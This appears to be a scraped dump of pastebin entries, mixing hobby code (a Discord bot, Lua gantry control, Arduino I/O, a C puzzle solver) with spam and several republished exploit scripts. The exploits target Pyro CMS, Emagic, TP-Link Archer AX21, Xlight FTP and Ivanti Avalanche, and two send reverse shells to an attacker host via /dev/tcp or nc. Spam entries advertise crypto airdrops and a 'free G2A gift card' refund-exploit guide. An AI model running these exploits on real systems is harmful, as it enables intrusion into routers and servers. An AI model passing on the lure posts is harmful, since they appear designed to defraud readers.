id,title,username,language,date,content
1EAtPgHK,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Sunday 21st of January 2024 11:46:00 PM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

825215"
StBS1AS2,scuffed,fearmoabs,JavaScript,Sunday 21st of January 2024 11:45:28 PM CDT,"  if (interaction.commandName === ""background"") {
    if (!interaction.inGuild()) {
      interaction.reply({
        content: ""You can only run commands in servers"",
        ephemeral: true,
      });
      return;
    }
    const { member, guild } = interaction;
    const choice = interaction.options.get(""choice"");
    const Data = await levelSchema.findOne({
      Guild: guild.id,
      User: member.id,
    });
    console.log(choice);
    if (
      choice === null &&
      Data.Bg1 === 1 &&
      Data.Bg2 === 1 &&
      Data.Bg3 === 1 &&
      Data.Bg4 === 1 &&
      Data.Bg5 === 1
    ) {
      interaction.reply(""You own every background! stay tuned, more to come!"");
      return;
    }
    if (choice === null) {
      const bgb = new AttachmentBuilder(""./bgs/bgb.png"", {
        name: ""bgb.png"",
      });
      const bgbe = new EmbedBuilder()
        .setColor(""#00FFFF"")
        .setDescription(
          `blue style, **costs 5,000$** Your current balance is ${Data.Cash} to select this background for your profile **rerun the command with ""1""** inside the choices`
        );

      const bgbw = new AttachmentBuilder(""./bgs/bgbw.png"", {
        name: ""bgbw.png"",
      });
      const bgbwe = new EmbedBuilder()
        .setColor(""#000000"")
        .setDescription(
          `black and white style, **costs 10,000$** Your current balance is ${Data.Cash} to select this background for your profile **rerun the command with ""2""** inside the choices`
        );

      const bgd = new AttachmentBuilder(""./bgs/bgd.png"", {
        name: ""bgd.png"",
      });
      const bgde = new EmbedBuilder()
        .setColor(""#FF0000"")
        .setDescription(
          `red moon style, **costs 10,000$** Your current balance is ${Data.Cash} to select this background for your profile **rerun the command with ""3""** inside the choices`
        );

      const bgp = new AttachmentBuilder(""./bgs/bgp.png"", {
        name: ""bgp.png"",
      });
      const bgpe = new EmbedBuilder()
        .setColor(""#A020F0"")
        .setDescription(
          `purple style, **costs 5,000$** Your current balance is ${Data.Cash} to select this background for your profile **rerun the command with ""4""** inside the choices`
        );

      const bgs = new AttachmentBuilder(""./bgs/bgs.png"", {
        name: ""bgs.png"",
      });
      const bgse = new EmbedBuilder()
        .setColor(""#FFC0CB"")
        .setDescription(
          `vibrant nature art style, **costs 25,000$** Your current balance is ${Data.Cash} to select this background for your profile **rerun the command with ""5""** inside the choices`
        );

      await interaction.reply({
        embeds: [bgbe],
        files: [bgb],
      });

      setTimeout(async () => {
        await interaction.editReply({
          embeds: [bgbwe],
          files: [bgbw],
        });
      }, 3000);
      setTimeout(async () => {
        await interaction.editReply({
          embeds: [bgde],
          files: [bgd],
        });
      }, 7000);
      setTimeout(async () => {
        await interaction.editReply({
          embeds: [bgpe],
          files: [bgp],
        });
      }, 12000);
      setTimeout(async () => {
        await interaction.editReply({
          embeds: [bgse],
          files: [bgs],
        });
      }, 18000);
      return;
    }
    if (choice.value === 1) {
      if (Data.Background === ""blue"") {
        interaction.reply(""you already have this background selected"");
        return;
      }
      if (Data.Bg1 === 1) {
        interaction.reply(
          ""background applied, you have not been charged since you own this background""
        );
        Data.Background = ""blue"";
        await Data.save();
        return;
      }
      if (Data.Cash < 5000) {
        interaction.reply(
          `you cannot afford this, it costs 5000$ you only have ${Data.Cash}`
        );
      } else {
        Data.Cash -= 5000;
        Data.Bg1 = 1;
        Data.Background = ""blue"";
        await Data.save();
        interaction.reply(
          ""youve purchased the blue style background for 5,000$""
        );
      }
    }
    if (choice.value === 2) {
      if (Data.Background === ""bandw"") {
        interaction.reply(""you already have this background selected"");
        return;
      }
      if (Data.Bg2 === 1) {
        interaction.reply(
          ""background applied, you have not been charged since you own this background""
        );
        Data.Background = ""bandw"";
        await Data.save();
        return;
      }
      if (Data.Cash < 10000) {
        interaction.reply(
          `you cannot afford this, it costs 5000$ you only have ${Data.Cash}`
        );
      } else {
        Data.Cash -= 10000;
        Data.Background = ""bandw"";
        Data.Bg2 = 1;
        await Data.save();
        interaction.reply(
          ""youve purchased the black and white style background for 10,000$""
        );
      }
    }

    if (choice.value === 3) {
      if (Data.Background === ""def"") {
        interaction.reply(""you already have this background selected"");
        return;
      }
      if (Data.Bg3 === 1) {
        interaction.reply(
          ""background applied, you have not been charged since you own this background""
        );
        Data.Background = ""def"";
        await Data.save();
        return;
      }
      if (Data.Cash < 10000) {
        interaction.reply(
          `you cannot afford this, it costs 5000$ you only have ${Data.Cash}`
        );
      } else {
        Data.Cash -= 10000;
        Data.Background = ""def"";
        Data.Bg3 = 1;
        await Data.save();
        interaction.reply(
          ""youve purchased the red moon style style background for 10,000$""
        );
      }
    }
    if (choice.value === 4) {
      if (Data.Background === ""purp"") {
        interaction.reply(""you already have this background selected"");
        return;
      }
      if (Data.Bg4 === 1) {
        interaction.reply(
          ""background applied, you have not been charged since you own this background""
        );
        Data.Background = ""purp"";
        await Data.save();
        return;
      }
      if (Data.Cash < 5000) {
        interaction.reply(
          `you cannot afford this, it costs 5000$ you only have ${Data.Cash}`
        );
      } else {
        Data.Cash -= 5000;
        Data.Background = ""purp"";
        Data.Bg4 = 1;
        await Data.save();
        interaction.reply(
          ""youve purchased the purple style style background for 5,000$""
        );
      }
    }
    if (choice.value === 5) {
      if (Data.Background === ""trees"") {
        interaction.reply(""you already have this background selected"");
        return;
      }
      if (Data.Bg1 === 1) {
        interaction.reply(
          ""background applied, you have not been charged since you own this background""
        );
        Data.Background = ""trees"";
        await Data.save();
        return;
      }
      if (Data.Cash < 25000) {
        interaction.reply(
          `you cannot afford this, it costs 5000$ you only have ${Data.Cash}`
        );
      } else {
        Data.Cash -= 25000;
        Data.Background = ""trees"";
        Data.Bg5 = 1;
        await Data.save();
        interaction.reply(
          ""youve purchased the vibrant nature art style background for 25,000$""
        );
      }
    }
  }"
p1EiXgTp,Untitled,ma39isy,JavaScript,Sunday 21st of January 2024 11:25:12 PM CDT,"const dataMasterPermohonanquery = knex('master_permohonan as mp')
        .select('mp.*', 'res.id_elevation', 'res.kode_aksi', 'ra.nama', 'res.tanggal_approve', 'res.pemutus', 'res.catatan as catatan', 'res.update_is_direksi')
        .leftJoin('ref_elevation_status as res', 'res.id_ref_status','mp.status')
        .leftJoin('ref_action as ra', 'ra.kode_aksi', 'res.kode_aksi')
        .where('mp.id', requestBody.idPermohonan)
        .where('res.kode_aksi', requestBody.kodeAksi)

const dataMasterPermohonan = await dataMasterPermohonanquery
        .first()

        let update_catatan = dataMasterPermohonan.catatan
        let update_pemutus = dataMasterPermohonan.pemutus
        let tanggal_approve = dataMasterPermohonan.tanggal_approve
           

            if (dataMasterPermohonan.update_is_direksi === true) {
                if(dataMasterPermohonan.status === 15){
                    dataMasterPermohonanquery.where('master_permohonan.is_direksi', knex.raw('ref_elevation_status.check_direksi'));
                    const tes = await dataMasterPermohonanquery.first()
                    console.log(tes)
                }

                await knex('master_permohonan')
                    .where('id', '=', requestBody.idPermohonan)
                    .update({
                    status : dataMasterPermohonan.id_elevation,
                    [update_catatan]: requestBody.catatan, 
                    [update_pemutus]: user.FullName, 
                    is_direksi:requestBody.isDireksi, 
                    [tanggal_approve] : currentDate
                });
               
                if (dataMasterPermohonan.id_elevation === 7) {
                    const innerDataMasterPermohonan = await knex('master_permohonan as mp')
                           .select(
                               'mp.id', 
                               'mp.no_rekening', 
                               'mp.nama_nasabah', 
                               'mp.nominal', 
                               'mp.eq', 
                               'mp.nisbah', 
                               'mp.tanggal', 
                               'mp.idcabang', 
                               'mp.idinduk', 
                               'rj.jangka_waktu', 
                               'rj.hari', 
                               'rs.status', 
                               'rs.id as idstatus', 
                               knex.raw(`
                                   case
                                       when mp.jenis_permohonan = 1
                                       then 'Penempatan Baru'
   
                                       else 'Perpanjangan'
                                   end as pengajuan
                               `),
                               knex.raw(`
                                   case 
                                       when mp.jenis_kepemilikan = 1 
                                       then 'Ritel'
   
                                       else 'Korporasi'
                                   end as pemilik
                               `), 
                               knex.raw(`
                                   case 
                                       when jenis_deposito = 1 
                                       then 'Bagi Hasil'
   
                                       else 'Jualah'
                                   end as deposito
                               `)
                           )
                           .leftJoin('ref_jangka as rj', 'rj.id', 'mp.idjangka')
                           .leftJoin('ref_status as rs', 'rs.id', 'mp.status')
                           .where('mp.id', '=', requestBody.idPermohonan)
                           .first();
   
                       const innerDataMasterEmail = await knex('master_email as me')
                           .leftJoin('master_permohonan as mp', 'mp.id', 'me.id_pemohon')
                           .where('me.id_pemohon', '=', requestBody.idPermohonan)
                           .select('me.email')
                           .first();
   
                       console.log('innerDataMasterEmail.email : ', innerDataMasterEmail.email);
                       const innerCcEmail = innerDataMasterEmail.email.split(',');
                       console.log('innerccEmail : ', innerCcEmail);
   
                       const htmlTemplate = `
                           <html>
                               <body>
                                   <p><i><strong> Assalamualaikum wr wb </strong></i></p>
                                   <p> Berikut data permohonan special nisbah : </p>
                                   </br>
                                   <p> Jenis Permohonan : ${innerDataMasterPermohonan.pengajuan} </p>
                                   <p> Segmentasi : ${innerDataMasterPermohonan.pemilik} </p>
                                   <p> Jenis Deposito : ${innerDataMasterPermohonan.deposito} </p>
                                   <p> Nama Nasabah : ${innerDataMasterPermohonan.nama_nasabah} </p>
                                   <p> Nominal : ${innerDataMasterPermohonan.nominal.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, ""$1,"")} </p>
                                   <p> Jangka Waktu : ${innerDataMasterPermohonan.jangka_waktu} </p>
                                   <p> Nisbah : ${innerDataMasterPermohonan.nisbah} % </p>
                                   <p> Indikasi E.q rate dimohon : ${innerDataMasterPermohonan.eq} % </p>
                                   <p> Email ini dibuat secara otomatis. Mohon tidak mengirimkan balasan ke email ini. </p>
                                   </br>
                                   <p><i><strong> Wassalamualaikum wr wb </strong></i></p>
                                   <p> Bank BJB Syariah </p>
                               </body>
                           </html>
                       `;
   
                       await kirimEmail(
                           innerCcEmail, 
                           innerCcEmail, 
                           'SPECIAL NISBAH IB MASLAHAH', 
                           htmlTemplate
                       );
                }
            }else{
                if(dataMasterPermohonan.kode_aksi === 'A'){
                    await knex('master_permohonan')
                    .where('id', '=', requestBody.idPermohonan)
                    .update({
                    status : dataMasterPermohonan.id_elevation,
                    [update_catatan]: requestBody.catatan, 
                    [update_pemutus]: user.FullName, 
                    [tanggal_approve] : currentDate
                    });
                    
                }else{
                    await knex('master_permohonan')
                    .where('id', '=', requestBody.idPermohonan)
                    .update({
                    status : dataMasterPermohonan.id_elevation,
                    [update_catatan]: requestBody.catatan, 
                    });

                }
            }"
p7sgxfU5,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Sunday 21st of January 2024 11:07:31 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_835269.pdf
 
Working as of
22 January 2024"
UDEHjYPk,Untitled,Tkap1,JavaScript,Sunday 21st of January 2024 11:05:26 PM CDT,"

class Tokenizer
{
	tokens = [];
	index = 0;
	consume_type_text(type, text) {
		if(tokens[index].type === type && tokens[index].text === text) {
			index += 1;
			return tokens[index - 1];
		}
		return null;
	}
	consume_type(type)
	{
		if(tokens[index].type === type) {
			index += 1;
			return tokens[index - 1];
		}
		return null;
	}
};


function parseTag(tokenizer) {
	if(!tokenizer.consume_type_text(""symbol"", ""<"")) { return {null, null}; }

	let token = tokenizer.consume_type(""identifier"", ""<"")
	if(token === null) { return {null, null}; }

	// ...
	// On success, something like
	return {node, tokenizer}

}

function parse(tokens) {
	let tokenizer = new Tokenizer();
	tokenizer.tokens = tokens;
	tokenizer.index = 0;

	// We don't want to pass a reference, because it will get modified even it we don't successfully parse a tag.
	parseTag({...tokenizer});
}"
StzRGDM3,Senju,PapiGemezs,PHP,Sunday 21st of January 2024 11:00:27 PM CDT,"{
   ""Senju"": [
      {
         ""version"": 1.1
      }
   ]
}"
swuVQA6y,smarter main,Claire9201,Lua,Sunday 21st of January 2024 10:59:01 PM CDT,"local motor = peripheral.wrap(""back"")


local DEBUG = true


local GRIDMULTX = 4
local GRIDMULTZ = 8


local currentPosition = {0,0,0}


local stickersEnabled = false


function toggleStickers()
  redstone.setOutput(""top"",true)
  sleep(0.5)
  redstone.setOutput(""top"",false)
  sleep(0.5)
  
  stickersEnabled = not stickersEnabled

  if DEBUG then
    print(""toggled stickers, state: "" .. tostring(stickersEnabled))
  end
end

function resetOutputs()
  redstone.setOutput(""left"",false)
  redstone.setOutput(""right"",false)
  
  if DEBUG then
    print(""reset outputs"")
  end
end

function waitTilFinished()
  repeat sleep(0.1) until not motor.isRunning()
  sleep(1)
  
  if DEBUG then
    print(""movement finished"")
  end
end


function newMoveX(targetX)

  print(targetX)
  print(currentPosition[1])

  local movement = targetX-currentPosition[1]
  print(movement)
  local movementType = 1
  if movement < 0 then
    movementType = -1
  end

  print(movement)
  print(math.abs(movement))
  print(movementType)

  resetOutputs()
  redstone.setOutput(""left"",true)
  sleep(.5)
  if DEBUG then
    print(""moving X"")
  end
  motor.move(math.abs(movement),-movementType)
  currentPosition[1] = currentPosition[1]+movement
  waitTilFinished()

end
function newMoveY(targetY)

  local movement = targetY-currentPosition[2]
  local movementType = 1
  if movement < 0 then
    movementType = -1
  end

  resetOutputs()
  redstone.setOutput(""left"",true)
  redstone.setOutput(""right"",true)
  sleep(.5)
  if DEBUG then
    print(""moving Y"")
  end
  motor.move(math.abs(movement),movementType)
  currentPosition[2] = currentPosition[2]+movement
  waitTilFinished()

end
function newMoveZ(targetZ)

  local movement = targetZ-currentPosition[3]
  local movementType = 1
  if movement < 0 then
    movementType = -1
  end

  resetOutputs()
  sleep(.5)
  if DEBUG then
    print(""moving Z"")
  end
  motor.move(math.abs(movement),movementType)
  currentPosition[3] = currentPosition[3]+movement
  waitTilFinished()

end


function moveX(movement,direction)
  resetOutputs()
  redstone.setOutput(""left"",true)
  sleep(.5)
  if DEBUG then
    print(""moving X"")
  end
  motor.move(movement,-direction)
  currentPosition[1] = currentPosition[1]+(movement*-direction)
  waitTilFinished()
end

function moveZ(movement,direction)
  resetOutputs()
  sleep(.5)
  if DEBUG then
    print(""moving Z"")
  end
  motor.move(movement,direction)
  currentPosition[3] = currentPosition[3]+(movement*direction)
  waitTilFinished()
end

function moveY(movement,direction)
  resetOutputs()
  redstone.setOutput(""left"",true)
  redstone.setOutput(""right"",true)
  sleep(.5)
  if DEBUG then
    print(""moving Y"")
  end
  motor.move(movement,direction)
  currentPosition[2] = currentPosition[2]+(movement*direction)
  waitTilFinished()
end


function resetGantry()
  
  if not redstone.getInput(""bottom"") then
    moveY(11,-1)
  end
  
  while not redstone.getInput(""bottom"") do
    if not redstone.getInput(""bottom"") then
      moveX(6,-1)
    end
    if not redstone.getInput(""bottom"") then
      moveZ(6,-1)
    end
  end

  currentPosition = {0,0,0}

  if DEBUG then
    print(""reset gantry"")
  end

end


function moveToPoint(x,y,z)
  
  if DEBUG then
    print(""moving to point: ("".. tostring(x) .. "", "" .. tostring(y) .. "", "" .. tostring(z) .. "")"")
  end

  newMoveX((x-1)*GRIDMULTX)
  newMoveZ((z-1)*GRIDMULTZ)
  newMoveY(y)

end


function grabContainer()

  if stickersEnabled then
    toggleStickers()
  end

  newMoveY(11)
  
  if not stickersEnabled then
    toggleStickers()
  end
  
  newMoveY(0)

end

function dropContainer()

  if not stickersEnabled then
    toggleStickers()
  end

  newMoveY(11)
  
  if stickersEnabled then
    toggleStickers()
  end
  
  newMoveY(0)

end


function grabContainerAt(x,z)

  moveToPoint(x,0,z)
  grabContainer()

end

function dropContainerAt(x,z)

  moveToPoint(x,0,z)
  dropContainer()

end

function printCurrentPosition()
  print(currentPosition[1])
  print(currentPosition[2])
  print(currentPosition[3])
end

function moveContainerTo(x1,z1,x2,z2)

  grabContainerAt(x1,z1)
  dropContainerAt(x2,z2)

end


resetGantry()
moveContainerTo(2,3,1,2)"
cSrVbMb4,Pet Simulator 99 Auto Fish v3,Killyoboy,Autohotkey,Sunday 21st of January 2024 10:56:34 PM CDT,"#MaxThreadsPerHotKey, 2
Toggle := 0
 
F1::
Toggle := !Toggle
 
While (Toggle) {
    Click
    Sleep, 3000
    Click
    Sleep, 100
    PixelSearch, tapX, tapY, 1499, 246, 1499, 872, 0x000000, 1, fast, RGB

    If (tapX) {
        While (tapX && Toggle) {
            Click
            Sleep, 10
            PixelSearch, tapX, tapY, 1499, 246, 1499, 872, 0x000000, 1, fast, RGB
        }
    }
}"
4tkzZ2jK,Mad,Unknown_No_1,PHP,Sunday 21st of January 2024 10:41:13 PM CDT,KalpoHatersByMad
Luz3nV2w,program fortran pertamaku,paperline27,Fortran,Sunday 21st of January 2024 10:20:26 PM CDT,"program HelloWorld
  ! Ini adalah program Hello, World! dalam Fortran
  
  ! Deklarasi pernyataan
  implicit none
  
  ! Bagian utama program
  write(*,*) 'Hello, World!'
  
end program HelloWorld

! jalankan program
! gfortran hello.f90 -o hello
! ./hello"
buyxgapy,Xlight FTP Server 3.9.3.6 - 'Stack Buffer Overflow' (DOS),FlyFar,Python,Sunday 21st of January 2024 10:08:34 PM CDT,"# Exploit Title: Xlight FTP Server 3.9.3.6 - 'Stack Buffer Overflow' (DOS)
# Discovered by: Yehia Elghaly
# Discovered Date: 2023-08-04
# Vendor Homepage: https://www.xlightftpd.com/
# Software Link : https://www.xlightftpd.com/download/setup.exe
# Tested Version: 3.9.3.6
# Vulnerability Type: Buffer Overflow Local
# Tested on OS: Windows XP Professional SP3 - Windows 11 x64

# Description: Xlight FTP Server 3.9.3.6 'Execute Program' Buffer Overflow (PoC)

# Steps to reproduce:
# 1. - Download and Xlight FTP Server
# 2. - Run the python script and it will create exploit.txt file.
# 3. - Open Xlight FTP Server 3.9.3.6
# 4. - ""File and Directory - Modify Virtual Server Configuration - Advanced - Misc- Setup 
# 6. - Execute a Program after use logged in-  Paste the characters 
# 7  - Crashed

#!/usr/bin/env python3

exploit = 'A' * 294

try: 
    with open(""exploit.txt"",""w"") as file:
        file.write(exploit)
    print(""POC is created"")
except:
    print(""POC not created"")
            "
EgCL3beE,Pyro CMS 3.9 - Server-Side Template Injection (SSTI) (Authenticated) - CVE-2023-29689,FlyFar,Python,Sunday 21st of January 2024 10:06:26 PM CDT,"# Exploit Title: Pyro CMS 3.9 - Server-Side Template Injection (SSTI) (Authenticated)
# Exploit Author: Daniel Barros (@cupc4k3d) - Hakai Offensive Security
# Date: 03/08/2023
# Vendor: https://pyrocms.com/
# Software Link: https://pyrocms.com/documentation/pyrocms/3.9/getting-started/installation
# Vulnerable Version(s): 3.9
# CVE: CVE-2023-29689
# Notes: You need a user who has access to /admin privilege

# Example Usage:
# First, run the script: python3 CVE-2023-29689.py
# Please follow these steps:
# 1. Enter the application URL: http://localhost:8000
# 2. Enter the email for authentication: admin@adm.com
# 3. Enter the password: Admin@@2023
# 4. Enter the command to be executed: id
# Result of command execution:
# uid=1000(cupcake) gid=1000(cupcake) groups=1000(cupcake)

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def login(session, url, email, password):
    login_url = urljoin(url, '/admin/login')
    response = session.get(login_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    token = soup.find('input', {'name': '_token'})['value']

    payload = {
        '_token': token,
        'email': email,
        'password': password
    }

    session.post(login_url, data=payload)

# Function to edit role 1 and extract the Description of the Admin user.
def edit_role_and_extract_description(session, url, command):
    edit_role_url = urljoin(url, '/admin/users/roles/edit/1')
    response = session.get(edit_role_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    token = soup.find('input', {'name': '_token'})['value']

    payload = {
        '_token': token,
        'name_en': 'Admin',
        'slug': 'admin',
        'description_en': f'{{{{[""{command}""]|map(""system"")|join}}}}',
        'action': 'save_exit'
    }

    session.post(edit_role_url, data=payload)

    # Extract the updated Description from role 1.
    response = session.get(urljoin(url, '/admin/users/roles'))
    soup = BeautifulSoup(response.content, 'html.parser')
    description = soup.find('td', {'data-title': 'Description'}).text.strip()

    return description
    
def main():
    url = input(""Enter the application URL: "")
    email = input(""Enter the email for authentication: "")
    password = input(""Enter the password : "")
    command = input(""Enter the command to be executed: "")

    with requests.Session() as session:
        login(session, url, email, password)
        description = edit_role_and_extract_description(session, url, command)
        print(""\nResult of command execution:"")
        print(description)

if __name__ == ""__main__"":
    main()
            "
zyk78E4p,Emagic Data Center Management Suite v6.0 - OS Command Injection - CVE-2023-37569,FlyFar,Bash,Sunday 21st of January 2024 10:00:52 PM CDT,"#!/bin/bash

# Exploit Title: Emagic Data Center Management Suite v6.0 - OS Command Injection
# Date: 03-08-2023
# Exploit Author: Shubham Pandey & thewhiteh4t
# Vendor Homepage: https://www.esds.co.in/enlight360
# Version: 6.0.0
# Tested on: Kali Linux
# CVE : CVE-2023-37569

URL=$1
LHOST=$2
LPORT=$3

echo ""*****************************""
echo ""*  ESDS eMagic 6.0.0 RCE    *""
echo ""*  > CVE-2023-37569         *""
echo ""*  > Shubham & thewhiteh4t  *""
echo ""*****************************""

if [ $# -lt 3 ]; then
    echo """"""
USAGE :

./exploit.sh http://<IP> <LHOST> <LPORT>
./exploit.sh http://192.168.0.10 192.168.0.20 1337
""""""
    exit 1
fi

url=""$1/index.php/monitor/operations/utilities/""

echo ""[+] URL   : $URL""
echo ""[+] LHOST : $LHOST""
echo ""[+] LPORT : $LPORT""
echo

payload=""bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F$LHOST%2F$LPORT%200%3E%261%27""

post_data=""utility=ping&operations=yes&hostname=%3B%20$payload&param_before=&param_after=&probe_id=1&rndval=1682490204846""

echo ""[!] Triggering exploit...""

echo $url

(sleep 3; curl -s -X POST -d $post_data $url > /dev/null) &

echo ""[+] Catching shell...""
nc -lvp 4444
            "
hjYjapzn,retry_read_tca,mikroavr,Arduino,Sunday 21st of January 2024 09:53:43 PM CDT,"#include <Wire.h>
#include ""TCA9555.h""
TCA9555 TCA1(0x20);
TCA9555 TCA2(0x21);
byte pin_tca[] = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 };

#define TCA9555_INPUT_PORT_REGISTER_0 0x00  //  read(0-7)
#define TCA9555_INPUT_PORT_REGISTER_1 0x01  //  read(8-15)
byte data_tca1_port0 = 0;
byte data_tca1_port1 = 0;
unsigned long cur_time, old_time;
bool port0 = 0;
bool port1 = 1;

byte addr_tca1 = 0x20;
byte addr_tca2 = 0x21;

void setup() {
  // put your setup code here, to run once:
  Serial.begin(115200);
  Wire.begin();
  TCA1.begin();
  TCA2.begin();
  for (int i = 0; i < sizeof(pin_tca); i++) {
    Serial.print(i);
    Serial.print("","");
    TCA1.pinMode(pin_tca[i], INPUT_PULLUP);
    TCA2.pinMode(pin_tca[i], INPUT_PULLUP);
  }
}

void loop() {
  // put your main code here, to run repeatedly:
  cur_time = millis();
  if (cur_time - old_time > 100) {
    byte _retry = 0;
    while (!baca_input1(addr_tca1, port0) && _retry < 10) {
      _retry++;
      Serial.print(""retry: "");
      Serial.println(_retry);
      delay(20);
    }
    _retry = 0;
    while (!baca_input1(addr_tca1, port1) && _retry < 10) {
      _retry++;
      Serial.print(""retry: "");
      Serial.println(_retry);
      delay(20);
    }

    Serial.print(""tca1 port0: "");
    Serial.println(data_tca1_port0,HEX);
    Serial.print(""tca1 port1: "");
    Serial.println(data_tca1_port1,HEX);

    old_time = millis();
  }
}

bool baca_input1(byte addr, byte mask) {
  bool flag_tca = 0;
  Wire.beginTransmission(addr);
  switch (mask) {
    case 0:
      Wire.write(TCA9555_INPUT_PORT_REGISTER_0);
      break;
    case 1:
      Wire.write(TCA9555_INPUT_PORT_REGISTER_1);
      break;
  }

  int rv = 0;
  rv = Wire.endTransmission();
  if (rv != 0) {
    flag_tca = 0;
    Serial.println(""gagal baca"");
  } else {
    Wire.requestFrom(addr, (uint8_t)1);
    switch (mask) {
      case 0:
        data_tca1_port0 = Wire.read();
        break;
      case 1:
        data_tca1_port1 = Wire.read();
        break;
    }

    flag_tca = 1;
  }
  return flag_tca;
}
"
jYm0vZ8p,Untitled,larrylailai,C,Sunday 21st of January 2024 09:51:37 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#define new(type) (type*)malloc(sizeof(type))
typedef unsigned long long ull;
 
void printans(int ans[11][11]){
    for (int i=1; i<=9; i++) for (int j=1; j<=9; j++) printf(""%d%c"", ans[i][j], "" \n""[j==9]);
}
 
bool valid(int map[9][9], int ans[11][11], int r, int c){
    int count=0;
    for (int m=-1; m<2; m++){
        for (int n=-1; n<2; n++) count+=ans[r+m+1][c+n+1];
    }
    return (count==map[r][c]);
}
 
bool check(int map[9][9], int ans[11][11], int index){
    int r = index/9, c = index%9;
    bool result = true;
    if (r*c!=0){
        result &= valid(map, ans, r-1, c-1);
        if (c==8) result &= valid(map, ans, r-1, c);
        if (r==8) result &= valid(map, ans, r, c-1);
        if (r==8 && c==8) result &= valid(map, ans, r, c);
    }
    return result;
}
 
bool recursion(int map[9][9], int ans[11][11], int index){
    int r = index/9, c = index%9;
    if (index==81) return true;
    ans[r+1][c+1] = 0;
    if (check(map, ans, index) && recursion(map, ans, index+1)) return true;
    ans[r+1][c+1] = 1;
    if (check(map, ans, index) && recursion(map, ans, index+1)) return true;
    return false;
}
 
int main(){
    int map[9][9], ans[11][11]={0};
    for (int i=0; i<9; i++) for (int j=0; j<9; j++) scanf(""%d"", &map[i][j]); 
    if (recursion(map, ans, 0)) printans(ans);
    else printf(""no solution\n"");
}"
TLvWhngJ,TP-Link Archer AX21 - Unauthenticated Command Injection - CVE-2023-1389,FlyFar,Python,Sunday 21st of January 2024 09:50:35 PM CDT,"#!/usr/bin/python3
# 
# Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection
# Date: 07/25/2023
# Exploit Author: Voyag3r (https://github.com/Voyag3r-Security)
# Vendor Homepage: https://www.tp-link.com/us/
# Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 (https://www.tenable.com/cve/CVE-2023-1389)
# Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0
# CVE: CVE-2023-1389
#
# Disclaimer: This script is intended to be used for educational purposes only.
# Do not run this against any system that you do not have permission to test. 
# The author will not be held responsible for any use or damage caused by this 
# program. 
# 
# CVE-2023-1389 is an unauthenticated command injection vulnerability in the web
# management interface of the TP-Link Archer AX21 (AX1800), specifically, in the
# *country* parameter of the *write* callback for the *country* form at the 
# ""/cgi-bin/luci/;stok=/locale"" endpoint. By modifying the country parameter it is 
# possible to run commands as root. Execution requires sending the request twice;
# the first request sets the command in the *country* value, and the second request 
# (which can be identical or not) executes it. 
# 
# This script is a short proof of concept to obtain a reverse shell. To read more 
# about the development of this script, you can read the blog post here:
# https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94
# Before running the script, start a nc listener on your preferred port -> run the script -> profit

import requests, urllib.parse, argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress warning for connecting to a router with a self-signed certificate
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Take user input for the router IP, and attacker IP and port
parser = argparse.ArgumentParser()

parser.add_argument(""-r"", ""--router"", dest = ""router"", default = ""192.168.0.1"", help=""Router name"")
parser.add_argument(""-a"", ""--attacker"", dest = ""attacker"", default = ""127.0.0.1"", help=""Attacker IP"")
parser.add_argument(""-p"", ""--port"",dest = ""port"", default = ""9999"", help=""Local port"")

args = parser.parse_args()

# Generate the reverse shell command with the attacker IP and port
revshell = urllib.parse.quote(""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "" + args.attacker + "" "" + args.port + "" >/tmp/f"")

# URL to obtain the reverse shell
url_command = ""https://"" + args.router + ""/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$("" + revshell + "")""

# Send the URL twice to run the command. Sending twice is necessary for the attack
r = requests.get(url_command, verify=False)
r = requests.get(url_command, verify=False)
            "
8HGcCzKM,Ivanti Avalanche <v6.4.0.0 - Remote Code Execution - CVE-2023-32560,FlyFar,Python,Sunday 21st of January 2024 09:48:36 PM CDT,"""""""
Exploit Title: Ivanti Avalanche <v6.4.0.0 - Remote Code Execution
Date: 2023-08-16
Exploit Author: Robel Campbell (@RobelCampbell)
Vendor Homepage: https://www.ivanti.com/
Software Link: https://www.wavelink.com/download/Downloads.aspx?DownloadFile=27550&returnUrl=/Download-Avalanche_Mobile-Device-Management-Software/
Version: v6.4.0.0
Tested on: Windows 11 21H2
CVE: CVE-2023-32560
Reference: https://www.tenable.com/security/research/tra-2023-27
""""""

import socket
import struct
import sys

# Create an item structure for the header and payload
class Item:
    def __init__(self, type_, name, value):
        self.type = type_
        self.name = name.encode()
        self.value = value
        self.name_size = 0x5
        self.value_size = 0x800

    def pack(self):
        return struct.pack('>III{}s{}s'.format(self.name_size, self.value_size),
                           self.type, self.name_size, self.value_size, self.name, self.value)

# Create a header structure
class HP:
    def __init__(self, hdr, payload):
        self.hdr = hdr
        self.payload = payload
        self.pad = b'\x00' * (16 - (len(self.hdr) + len(self.payload)) % 16)

    def pack(self):
        return b''.join([item.pack() for item in self.hdr]) + \
               b''.join([item.pack() for item in self.payload]) + self.pad

# Create a preamble structure
class Preamble:
    def __init__(self, hp):
        self.msg_size = len(hp.pack()) + 16
